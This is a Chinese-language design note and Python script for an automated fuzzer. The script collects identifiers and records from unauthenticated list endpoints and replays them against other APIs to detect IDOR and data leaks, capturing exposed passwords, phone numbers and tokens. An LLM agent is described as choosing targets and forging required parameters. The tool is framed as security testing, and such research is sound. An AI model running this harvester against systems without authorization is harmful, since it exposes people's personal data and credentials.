# 🚀 API Parameter Chaining Fuzzer 执行架构与伪代码实现思路

本工具的核心目标是：**实现从静态提取到动态漏洞验证（DAST）的无缝衔接。**
整个自动化探测机制分为三大模块：解析层、编排层与发包探测层。

## 🤖 为什么需要 Agent (LLM)？
在这个架构中，Python 脚本（如 `id_chain_analyzer.py`）只负责做“确定性”的脏活（提取路由、提取所有参数）。但真实的业务系统极其复杂，**Agent (大语言模型)** 在这里扮演着不可替代的“决策大脑”角色：

1. **语义级防破坏校验 (Safety Net)**: 脚本只能通过简单的黑名单（如过滤掉名字里带 `del` 的接口）来防止破坏数据。但这会导致误杀或漏杀。Agent 能够阅读源码，准确判定一个接口是否涉及真实的状态修改，从而决定是否放行测试。
2. **复杂参数别名映射 (Parameter Aliasing)**: 脚本只能机械地匹配相同名字的字段。但如果 Source 接口返回的是 `{"document_no": "777"}`，而 Sink 接口需要的参数叫 `?docNum=777`，脚本就会放弃串联。Agent 拥有强大的自然语言理解能力，能够主动进行映射转换。
3. **业务逻辑阻断参数的智能处理 (Correlation & Mocking)**: 很多靶点接口除了核心参数外，还强制要求传入一些非关键业务参数才能往下走。
   - **Agent 的降维打击**：
     - **首选策略（真实实体数据回填）**：如果 Agent 在之前请求别的接口时，不仅拿到了 `orderId`，还一同拿到了该订单的 `startDate` 和 `status`，Agent 会**优先将这些真实且强关联的实体数据如实填入**，保证请求的最高真实度。
     - **兜底策略（智能伪造）**：如果在其他接口中确实没有获取到这些必填字段，Agent 可以根据参数名和类型智能“伪造”出合法的前置数据。

## 1. 架构设计

### 模块 A: 路由与参数解析 (Parser)
- 依赖于 `java-route-mapper/scripts/spring_route_extractor.py`。
- 将生成的 `routes.json` 投递给 `id_chain_analyzer.py`。
- `id_chain_analyzer.py` 负责：
  1. **执行安全剔除**: 拦截所有包含 `delete`, `update`, `remove` 等修改数据库状态的接口。
  2. **构建串联图谱**: 将接口分为两类：
     - **Source (泄漏源)**: 带有 `list`, `page`, `detail` 的 GET/POST 接口，预期返回 JSON 实体数据。
     - **Sink (受害者/靶点)**: 明确在 URL Params 或 Body 中需要传入参数的接口。

### 模块 B: AI 动态发包编排 (Fuzzer Orchestrator)

**步骤 1：获取基准环境**
- 测试必须在一个普通用户的目标 URL 环境下进行。

**步骤 2：信息收集与实体绑定 (Harvesting & Entity Correlation)**
- AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list` 或 `/api/v1/orders/page`）。
- **【核心机制：动态实体金库与强关联原则】**：
  - **原则：根据一个查询动作查到的所有参数，说明它们是强关联的实体，必须放在同一行。**
  - 解析响应 JSON 时，**绝不局限于 ID**。提取 JSON Object 中的所有关键字段（如 `userId`, `order_no`, `session_token`, `status`）。
  - **同级对象绑定**：只要这些字段出现在同一个 JSON Object 中，就认为它们属于同一个实体。
  - **级联绑定 (Cascading)**：如果用 `userId` 去请求详情接口，返回了 `deptId` 和 `phone`，那么这些新查出的参数必须和原来的 `userId` **合并到同一行记录中**。
- 将这些强关联的字典作为一行记录，追加写入到本地持久化文件（如 `parameter_vault.jsonl`）中。

**步骤 3：参数碰撞、敏感信息捕获与越权验证 (Collision & Validation)**
- 遍历所有 Sink 接口。
- 读取 `parameter_vault.jsonl`。如果当前 Sink 接口需要传入 `[userId, order_no]`，引擎会遍历金库中的每一行，只要某一行同时拥有这两个键，就把对应的值取出来注入到请求中。
- **【核心动作：全流量日志保存 (Traffic Logging)】**：每一次碰撞发包的完整请求（URL、Payload）和响应（状态码、完整 Body）都会被追加记录到本地的 `fuzzing_traffic.log` 文件中。这不仅是为了给 Agent 提供分析素材，更是为了保留“呈堂证供”，方便安全研究员事后人工复核，防止 AI 漏报。
- **【核心动作：敏感信息捕获与持久化】**：Agent 在收到 HTTP 响应后，必须扫描 JSON 字典中的 Key。如果发现了诸如 `password`, `phone`, `cardid`, `token` 等高价值敏感字段，立刻记录，并**强制追加写入到 `fuzzer_vulnerabilities.md` 漏洞报告文件中**，作为漏洞存在的实锤证据。

## 2. 核心 Fuzzer 伪代码 (Python)

为了实现工程化和自动化，测试的**基准环境参数必须由用户动态传入**，绝不能硬编码。我们通过命令行参数 (`argparse`) 来接收这些必要信息。因为主要是测试未授权接口，所以只需要提供 URL 即可。

```python
import requests
import json
import os
import argparse

# ==========================================
# 动态接收用户输入 (环境配置)
# ==========================================
parser = argparse.ArgumentParser(description="API ID Chain Fuzzer (Unauthenticated)")
parser.add_argument("--url", required=True, help="Base URL of the target API (e.g., http://target.com)")
parser.add_argument("--graph", default="chain_graph.json", help="Path to the chain graph file")
args = parser.parse_args()

BASE_URL = args.url.rstrip('/')
VAULT_FILE = "parameter_vault.jsonl"
TRAFFIC_LOG_FILE = "fuzzing_traffic.log"

with open(args.graph, "r") as f:
    graph = json.load(f)

headers = {
    "Content-Type": "application/json",
    # 模拟普通未登录用户的常见 UA
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

def log_traffic(url, method, payload, status_code, response_text):
    """将请求与响应完整保存到本地日志文件"""
    with open(TRAFFIC_LOG_FILE, "a", encoding="utf-8") as lf:
        log_entry = (
            f"==========\n"
            f"REQUEST: {method} {url}\n"
            f"PAYLOAD: {json.dumps(payload)}\n"
            f"RESPONSE CODE: {status_code}\n"
            f"RESPONSE BODY: {response_text}\n"
            f"==========\n\n"
        )
        lf.write(log_entry)

# ==========================================
# 阶段 1: 动态提取并持久化 ID 金库
# ==========================================
print("[*] Phase 1: Harvesting dynamic bound IDs into Vault...")

def save_to_vault(id_dict):
    # 将字典按行写入金库
    with open(VAULT_FILE, "a") as vf:
        vf.write(json.dumps(id_dict) + "\n")

# 清空旧金库
if os.path.exists(VAULT_FILE):
    os.remove(VAULT_FILE)

# 用于存储暂时的强关联记录，支持后续的级联扩充
memory_vault = []

for source in graph["sources_for_leakage"]:
    try:
        if source["method"] == "GET":
            res = requests.get(BASE_URL + source["path"], headers=headers, timeout=5)
            try:
                json_data = res.json()
                def extract_objects(obj):
                    if isinstance(obj, list):
                        for item in obj:
                            if isinstance(item, dict):
                                # 动态提取实体中的所有有效参数（不再局限于 ID）
                                # 将同一个字典（JSON Object）中的所有键值对作为一个强关联的实体保存
                                entity_dict = {k: v for k, v in item.items() if isinstance(v, (str, int, bool))}
                                # 如果字典不为空，则认为它们是强关联的
                                if entity_dict:
                                    # 检查是否能与 memory_vault 中已有的行进行“级联绑定”
                                    merged = False
                                    for existing_row in memory_vault:
                                        # 寻找交集（只要有任意一个业务主键/关键参数相同，比如 order_no 相同）
                                        common_keys = set(entity_dict.keys()) & set(existing_row.keys())
                                        if common_keys and all(entity_dict[k] == existing_row[k] for k in common_keys):
                                            # 匹配成功！合并新的参数到同一行实体中
                                            existing_row.update(entity_dict)
                                            merged = True
                                            break
                                    if not merged:
                                        memory_vault.append(entity_dict)
                            extract_objects(item)
                    elif isinstance(obj, dict):
                        for k, v in obj.items():
                            extract_objects(v)
                            
                extract_objects(json_data)
            except json.JSONDecodeError:
                pass
    except Exception as e:
        continue

# 最终将内存中已经合并/级联好的记录，写入持久化金库文件
for row in memory_vault:
    save_to_vault(row)

print(f"[+] Harvested {len(memory_vault)} correlated ID rows saved to {VAULT_FILE}.")

# ==========================================
# 阶段 2: 查阅金库并进行动态匹配 Fuzzing
# ==========================================
print("[*] Phase 2: Fuzzing Sinks with Vault records...")

# 将金库加载到内存
vault_records = []
if os.path.exists(VAULT_FILE):
    with open(VAULT_FILE, "r") as vf:
        for line in vf:
            vault_records.append(json.loads(line.strip()))

for sink in graph["sinks_for_exploitation"]:
    path = sink["path"]
    method = sink["method"]
    req_ids = sink["required_ids"] # 动态读取需要的 key，例如 ["doc_id", "userId"]
    
    # 从金库中筛选出能满足该 Sink 全部必填 ID 的行
    applicable_records = [rec for rec in vault_records if all(req_id in rec for req_id in req_ids)]
    
    for record in applicable_records[:5]:  # 每个接口挑 5 行数据测试
        target_url = BASE_URL + path
        if method == "GET":
            # 动态拼接: ?doc_id=xxx&userId=yyy
            query_str = "&".join([f"{k}={record[k]}" for k in req_ids])
            target_url += f"?{query_str}"
            
            res = requests.get(target_url, headers=headers)
            
            # 无论成功失败，将全流量写入日志
            log_traffic(target_url, "GET", None, res.status_code, res.text)
            
            if res.status_code == 200 and str(record[req_ids[0]]) in res.text:
                # 简单敏感词正则匹配（供 Agent 或脚本告警使用）
                sensitive_keys = ['password', 'phone', 'mobile', 'email', 'cardid', 'idcard', 'token']
                leaked_sensitive_data = {k: v for k, v in res.json().items() if any(sk in k.lower() for sk in sensitive_keys)}
                
                print(f"[!!!] VULNERABILITY FOUND (IDOR / Info Leak):")
                print(f"      Endpoint: {target_url}")
                print(f"      Payload from Vault: {record}")
                if leaked_sensitive_data:
                    print(f"      [CRITICAL] Leaked Sensitive Data: {json.dumps(leaked_sensitive_data)}")
                else:
                    print(f"      Leaked Info: {res.text[:100]}...")
```

## 3. 落地建议
对于纯白盒（SAST）场景，AI 可以在提取出 `chain_graph.json` 后，**直接审阅对应 Controller 的源码**。
AI 不需要真的发包，只需做以下推理：
1. 接口 A (Source) 确实没有加 `@RequiresRoles("ADMIN")`，普通用户可查。
2. 接口 B (Sink) 接收了 `userId`，但代码里直接调用了 `userService.getById(userId)`，**完全没有进行** `if (currentLoginId != userId)` 的判断逻辑。
3. 结论：存在 IDOR 漏洞。

这是一种将 DAST 动态思想转化为 SAST 静态追踪规则的完美范例。